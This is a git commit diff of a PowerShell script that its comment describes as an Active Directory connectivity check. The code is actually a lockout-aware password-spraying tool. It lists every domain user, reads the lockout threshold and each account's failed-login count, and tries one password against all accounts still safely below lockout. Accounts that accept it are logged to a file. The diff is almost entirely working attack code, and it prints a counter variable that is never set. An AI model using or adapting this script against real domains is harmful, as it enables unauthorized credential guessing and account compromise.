8ba5f723afc4dc5c80903f418fcbcad6d0bee112
ysN <62604022+7ysN@users.noreply.github.com>
2024-06-05 08:45:45 +0300

    Update Test-ADConnection.ps1

--- Test-ADConnection.ps1
+++ Test-ADConnection.ps1
@@ -1,5 +1,5 @@
-
-# This Script helps to perform a connectivity check against the Active Directory LDAP service.
+# Author: ysN
+## This Script helps to perform a connectivity check against the Active Directory LDAP service.
 
 Function Test-ADConnection {
     param(
@@ -7,18 +7,42 @@ Function Test-ADConnection {
         $password)   
     return (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
 }
-$password = Read-Host 'Enter A Password'
-$Counter = 0 
-$total = (Get-WmiObject -Class Win32_UserAccount | Measure-Object).Count
-$DomainName = (Get-WmiObject -Class Win32_UserAccount | Select-Object -Index 10).Domain
 
-Get-WmiObject -Class Win32_UserAccount | ForEach-Object{
-    $UserName = $_.Caption
-    $auth = Test-ADConnection -username $UserName -password $password
-    if($auth -eq "True"){
-        Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
-        $UserName -replace "$DomainName\\"| Out-File UsersFound.txt -Append
+# Password Policy Definition
+$secpol = net accounts
+$lockoutThreshold = ($secpol -match '^Lockout threshold:\s*(\d+)')[0] -replace '^Lockout threshold:\s*'
+$Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
+$ldapPath = "LDAP://$Domain"
+$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
+$directorySearcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
+$directorySearcher.Filter = "(&(objectCategory=person)(objectClass=user))"
+$directorySearcher.PropertiesToLoad.AddRange(@("badPwdCount", "sAMAccountName")) 
+$users = $directorySearcher.FindAll()
+$total = $users.Count
+
+Write-Host -ForegroundColor Cyan "Collecting users..."
+Write-Host -ForegroundColor Yellow "[+] Total Domain Users: $total"
+Write-Host "`n"
+Write-Host -NoNewline -ForegroundColor Yellow "Enter A Password: "
+$password = Read-Host
+$Counter = 0 
+$users | ForEach-Object {   
+    $userProperties = $_.Properties
+    $UserName = $userProperties["sAMAccountName"][0]
+    $BadPwdCount = $userProperties["badPwdCount"][0]
+    if (($LockoutThreshold -eq 0) -or (($LockoutThreshold - $BadPwdCount) -gt 2)) {
+        $auth = Test-ADConnection -username $UserName -password $password
+        if($auth -eq "True"){
+            Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
+            $UserName | Out-File UsersFound.txt -Append
+        }
+        Write-Progress -Activity "In Progress:" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
+        $Counter++
+    } else {
+        Write-Host -ForegroundColor Red "[-] Skipped: $UserName have less than 2 loggon attempts!"
     }
-    Write-Progress -Activity "In Progress" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
-    $Counter++    
 }
+Write-Host "`n"
+Write-Host -ForegroundColor Yellow "[+] Users Found: $users_found_num"
+Write-Host -ForegroundColor Green "Saving Results To: 'UsersFound.txt'" 
+
